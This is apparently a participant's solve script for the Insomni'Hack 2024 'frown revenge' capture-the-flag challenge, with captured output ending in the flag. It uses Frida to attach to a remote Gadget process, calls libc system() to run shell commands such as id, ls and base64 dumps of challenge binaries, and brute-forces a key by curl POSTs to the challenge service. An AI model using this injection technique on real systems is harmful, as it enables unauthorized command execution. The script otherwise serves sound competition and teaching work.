#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------
# Insomni'Hack 2024 - frown revenge (RE 102)
#
# To make this attack work run the service using local port forwarding:
#   `ssh -L 27042:127.0.0.1:27042 frown-revenge.insomnihack.ch -p24 -l user`
# 
# Once you see the message `[Frida INFO] Listening on 127.0.0.1 TCP port 27042`, hit `p`
# and then you can run the script.
# ----------------------------------------------------------------------------------------
import frida
import sys


# ----------------------------------------------------------------------------------------
def get_frida_device():
    """Gets the Frida device (there are 3 ways to do it)."""
    # 1st way:
    devices = frida.get_device_manager().enumerate_devices()
    for device in devices:
        print(f'[+] Enumerating device: {device.id}')

    # 2nd way:
    device = frida.get_remote_device()
    print(f'[+] Remote device: {device}')

    # 3rd way:
    process = frida.get_device_manager()
    device = process.add_remote_device("0.0.0.0:27042")
    print(f'[+] Added remoted device: {device}')

    return device


# ----------------------------------------------------------------------------------------
def exec_shell_cmd(cmd):
    """Executes a shell command through Frida's API."""
    # First resolve the address of libc.system() and then invoke it.
    script = session.create_script(f"""
        var sysPtr = Module.findExportByName('libc.so.6', 'system');
        //console.log('[+] libc.system() at:' + sysPtr);

        var system = new NativeFunction(sysPtr, 'int', ['pointer']);
        var retv = system(Memory.allocUtf8String('{cmd}'));
        //console.log('[+] libc.system() return value:' + retv);

        send('Script finished successfully.');
    """)

    def on_message(message, data):
        if message['type'] == 'send':
            #print(f"[*] Output: {message['payload']}")
            pass

    script.on('message', on_message)
    script.load()


# ----------------------------------------------------------------------------------------
def brute_force_flag():
    """Brute-forces the flag using a list of flag keys."""
    script = session.create_script("""
        var sysPtr = Module.findExportByName("libc.so.6", "system");
        console.log('[+] system() at: ' + sysPtr);
        var system = new NativeFunction(sysPtr, 'int', ['pointer']);
        
        const flag_keyz = [
             '>o:9?jl?cmibkci>?8i8b??hc8?jm:n8',
             '?n;8>km>blhcjbh?>9h9c>>ib9>kl;o9',
             '<m8;=hn=aok`iak<=:k:`==ja:=ho8l:',
             '=l9:<io<`njah`j=<;j;a<<k`;<in9m;',
             ':k>=;nh;gimfogm:;<m<f;;lg<;ni>j<',
             ';j?<:oi:fhlgnfl;:=l=g::mf=:oh?k=',
             '8i<?9lj9ekodmeo89>o>d99ne>9lk<h>',
             '9h=>8mk8djneldn98?n?e88od?8mj=i?',
             '6g217bd7keajcka670a0j77`k07be2f0',
             '7f306ce6jd`kbj`761`1k66aj16cd3g1',
             '4e035`f5igchaic452c2h55bi25`g0d2',
             '5d124ag4hfbi`hb543b3i44ch34af1e3',
             '2c653f`3oaengoe234e4n33do43fa6b4',
             '3b742ga2n`dofnd325d5o22en52g`7c5',
             '0a471db1mcglemg016g6l11fm61dc4`6',
             '1`560ec0lbfmdlf107f7m00gl70eb5a7',
             '$u #%pv%ywsxqys$%"s"x%%ry"%pw t"',
             '%t!"$qw$xvrypxr%$#r#y$$sx#$qv!u#',
             '|-x{}(.}!/+ )!+|}z+z }}*!z}(/x,z',
             '},yz|)/| .*!( *}|{*{!||+ {|).y-{',
             'n?jio:<o3=92;39noh9h2oo83ho:=j>h',
             'o>khn;=n2<83:28oni8i3nn92in;<k?i',
             'l=hkm8>m1?;091;lmj;j0mm:1jm8?h<j',
             'm<ijl9?l0>:180:mlk:k1ll;0kl9>i=k',
             'j;nmk>8k79=6?7=jkl=l6kk<7lk>9n:l',
             'k:olj?9j68<7>6<kjm<m7jj=6mj?8o;m',
             'h9loi<:i5;?4=5?hin?n4ii>5ni<;l8n',
             'i8mnh=;h4:>5<4>iho>o5hh?4oh=:m9o',
             'f7bag24g;51:3;1fg`1`:gg0;`g25b6`',
             'g6c`f35f:40;2:0gfa0a;ff1:af34c7a',
             'd5`ce06e9738193deb3b8ee29be07`4b',
             'e4abd17d8629082edc2c9dd38cd16a5c',
             'b3fec60c?15>7?5bcd5d>cc4?dc61f2d',
             'c2gdb71b>04?6>4cbe4e?bb5>eb70g3e',
             '`1dga42a=37<5=7`af7f<aa6=fa43d0f',
             'a0ef`53`<26=4<6a`g6g=``7<g`52e1g'
        ];

        for (var i = 0; i < flag_keyz.length; i++) {
            system(Memory.allocUtf8String('echo ""'));
            system(
                Memory.allocUtf8String(
                    'curl -X POST http://frown-service/ -d "' +
                    encodeURIComponent(flag_keyz[i]) +
                    '"'));
        }
    """)
    
    script.load()


# ----------------------------------------------------------------------------------------
if __name__ == "__main__":
    print('[+] frown crack started.')

    device = get_frida_device()

    # Enumerate processes in the remote device (process should be "Gadget").
    # 
    # ┌─[22:57:54]─[✗:1]─[ispo@ispo-glaptop2]─[~/ctf/insomnihack_2024/frown]
    # └──> frida-ps -R
    #   PID  Name
    #   --  ------
    #   18  Gadget
    for process in device.enumerate_processes():
        print(f'[+] Enumerating process: {process}')
        session = device.attach(process.name)
        break

    # Or:
    # session = device.attach("Gadget")

    '''
    # Run some shell commands.
    exec_shell_cmd('clear')
    exec_shell_cmd('id')
    exec_shell_cmd('ls -la')

    # Fetch the challenge binaries:
    exec_shell_cmd('echo "---------- TETRIS ----------"')
    exec_shell_cmd('cat /usr/local/bin/tetris | base64')

    # libttyris.so: /usr/lib/libttyris.so
    #exec_shell_cmd('whereis libttyris.so')

    exec_shell_cmd('echo "---------- LIBTTYRIS ----------"')
    exec_shell_cmd('cat /usr/lib/libttyris.so | base64')

    #exec_shell_cmd('cat /usr/sbin/tetris.sh')
    '''

    # Brute force key (it's 1 byte long).
    exec_shell_cmd('clear')
    brute_force_flag()

    print('[+] Program finished. Bye bye :)')

# ----------------------------------------------------------------------------------------
r"""
┌─[:(]─[23:29:52]─[ispo@ispo-glaptop2]─[~/ctf/insomnihack_2024/frown-revenge]
└──> ./frown_revenge_crack.py 
[+] frown crack started.
[+] Enumerating device: local
[+] Enumerating device: socket
[+] Enumerating device: barebone
[+] Remote device: Device(id="socket", name="Local Socket", type='remote')
[+] Added remoted device: Device(id="socket@0.0.0.0:27042", name="0.0.0.0:27042", type='remote')
[+] Enumerating process: Process(pid=18, name="Gadget", parameters={})
[+] system() at: 0x7f6dbac593a0
[+] Program finished. Bye bye :)


* * * * * OUTPUT IN THE CHALLENGE WINDOW (TETRIS) * * * * *


<	BuQ~Q�OXeoCC(pjypoE.B\SfXb.b9~p
Itw'3/iZBuRPYdo@C)pjxpoF/B\'\SeYc/c8q
Iqt:%vUiZ>
BuS|K
e;73}.5pj{my7UB\$\SdZ`,%d-p
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

[..... TRUNCATED FOR BREVITY .....]

)ilP}.|?|aT;1o2T*e'X@E9b3*<
G_Xml/2/r<S_c$^
)imQ})}>|aW:0n2T)d&YAEx8b3+<                                                               V8
DC^vk%vTiZ
?PBuU85Hoy5}1KO#=`>y<y7TB\%Z\Sb<4w.]
EB_wj%vSiZ	>QBuV86Ony5~0JO#<a?x=y7SB\$[\Sa<5w.Z
JMPxe2qpiZ	cTBuV.@oL]kj6
UnO#3n0w2n0pB\y^\S*tBc{~
KLQ<40#$yne$Sv2.~Nz<=:g
}(v2o13clb$R	x.MMu%a\)
HO/2c 'z
raV_w..XONY4?94=]51lw e?a'Q
d{\Ak"ba!
INS{f1rst_yoU_try_AND_hide_AnD_s0m3t1m3s_You_ARE_lucky}
gPBuR*@kHYo>ibCF        $7j4s6j4tB\Z\Se                          NIT|a6utiZ
*tFgz
*tEf~{                                      OHU}`7tuiZfQBuQ+@hIXn?hcC%6k5r7k5uB\|[\Sf
L(fg$#ne!Tq2.N;j6ZoCO#pob'1;e#Ux+JLr%aY.
*tDf8*                                          MJW'6u"L}f@T%+@iI?jgFhB\w4i7ppj4"TJk|JJ#

"""
# ----------------------------------------------------------------------------------------

